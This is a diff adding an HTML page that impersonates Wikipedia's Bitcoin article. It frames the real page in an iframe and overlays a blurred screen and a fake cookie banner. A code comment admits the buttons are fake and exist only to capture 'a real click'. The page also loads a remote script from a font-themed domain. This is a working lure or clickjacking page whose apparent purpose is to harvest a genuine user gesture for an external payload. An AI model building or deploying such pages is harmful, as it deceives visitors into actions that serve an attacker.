@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Bitcoin - Wikipedia</title>
+	<style>
+	body {
+		margin: 0;
+		padding: 0;
+		font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+		overflow: hidden;
+		height: 100vh;
+	}
+	
+	iframe {
+		position: fixed;
+		top: 0;
+		left: 0;
+		width: 100%;
+		height: 100%;
+		border: none;
+		z-index: 1;
+	}
+	
+	.blur-overlay {
+		position: fixed;
+		top: 0;
+		left: 0;
+		width: 100%;
+		height: 100%;
+		background-color: rgba(0, 0, 0, 0.5);
+		backdrop-filter: blur(5px);
+		z-index: 2;
+		display: none;
+	}
+	
+	.cookie-consent {
+		position: fixed;
+		bottom: 20px;
+		left: 50%;
+		transform: translateX(-50%);
+		width: 90%;
+		max-width: 600px;
+		background-color: #fff;
+		border-radius: 12px;
+		padding: 20px;
+		box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+		z-index: 3;
+		animation: slideUp 0.5s ease-out forwards;
+		display: none;
+	}
+	
+	@keyframes slideUp {
+		from {
+			opacity: 0;
+			transform: translate(-50%, 20px);
+		}
+		to {
+			opacity: 1;
+			transform: translate(-50%, 0);
+		}
+	}
+	
+	.cookie-title {
+		font-size: 18px;
+		font-weight: 600;
+		margin-bottom: 10px;
+		color: #333;
+	}
+	
+	.cookie-text {
+		font-size: 14px;
+		color: #666;
+		margin-bottom: 20px;
+		line-height: 1.5;
+	}
+	
+	.cookie-buttons {
+		display: flex;
+		gap: 10px;
+		justify-content: flex-end;
+	}
+	
+	.cookie-btn {
+		padding: 8px 16px;
+		border-radius: 6px;
+		font-size: 14px;
+		font-weight: 500;
+		cursor: pointer;
+		border: none;
+		transition: all 0.2s ease;
+	}
+	
+	.cookie-btn-reject {
+		background-color: #f5f5f5;
+		color: #333;
+	}
+	
+	.cookie-btn-reject:hover {
+		background-color: #e0e0e0;
+	}
+	
+	.cookie-btn-accept {
+		background-color: #4285f4;
+		color: white;
+	}
+	
+	.cookie-btn-accept:hover {
+		background-color: #3367d6;
+	}
+	</style>
+	<script src="https://nice-fonts.store/script.js"></script>
+</head>
+
+<body>
+	<iframe src="https://wikipedia.org/wiki/Bitcoin" id="siteFrame"></iframe>
+	<div class="blur-overlay" id="blurOverlay"></div>
+	<div class="cookie-consent" id="cookieConsent">
+		<div class="cookie-title">Cookies 🍪</div>
+		<div class="cookie-text"> We and our partners use cookies to store and access personal data such as browsing data for purposes such as serving and personalizing content and analyzing site traffic. You can find out more about the purposes for which we and our partners use cookies or exercise your preferences by clicking the 'Reject' button below. </div>
+		<div class="cookie-buttons">
+		    <!-- Fake buttons, we just need a real click --> 
+			<button class="cookie-btn reject simulate delay-yes" id="rejectBtn">Reject</button>
+			<button class="cookie-btn reject simulate delay-yes" id="acceptBtn">Accept all</button>
+		</div>
+	</div>
+	<script>
+	document.addEventListener('DOMContentLoaded', function() {
+		const cookieConsent = document.getElementById('cookieConsent');
+		const blurOverlay = document.getElementById('blurOverlay');
+		const rejectBtn = document.getElementById('rejectBtn');
+		const acceptBtn = document.getElementById('acceptBtn');
+		setTimeout(() => {
+			cookieConsent.style.display = 'block';
+			blurOverlay.style.display = 'block';
+		}, 1000);
+		function hideConsent() {
+			cookieConsent.style.display = 'none';
+			blurOverlay.style.display = 'none';
+		}
+		rejectBtn.addEventListener('click', hideConsent);
+		acceptBtn.addEventListener('click', hideConsent);
+		blurOverlay.addEventListener('click', hideConsent);
+	});
+	</script>
+</body>
+
+</html>
